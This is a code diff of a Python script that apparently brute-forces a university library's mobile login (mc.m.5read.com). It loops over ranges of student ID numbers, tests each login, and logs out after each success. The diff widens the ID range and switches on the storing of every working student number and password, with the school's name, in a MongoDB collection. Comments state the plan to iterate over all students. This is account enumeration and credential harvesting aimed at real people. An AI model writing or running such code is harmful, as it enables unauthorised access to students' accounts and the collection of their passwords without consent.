@@ -4,10 +4,10 @@ from pymongo import Connection
 from time import sleep
 
 
-#con = Connection()
-#db = con['hbsl_library_crawler']
+con = Connection()
+db = con['hbsl_library_crawler']
 
-for i in range(201315401, 201315430):
+for i in range(201400101, 201400240):
     print(i)
     # 先用一个学生，以后想办法遍历所有学生
     #student_number = '201300150'
@@ -80,7 +80,7 @@ for i in range(201315401, 201315430):
     if('用户名或密码错误' not in r3.text):
         print('成功，学号' + student_number + ' 存在')
         # 登陆成功，该学号对应的账号存在
-        #db.student_account.insert( {'student_number': student_number, 'password': student_password, 'school': '华北水利水电大学'})
+        db.student_account.insert( {'student_number': student_number, 'password': student_password, 'school': '华北水利水电大学'})
         # 登出
         r5 = s.get('http://mc.m.5read.com/user/logout/logout.jspx')
     else:
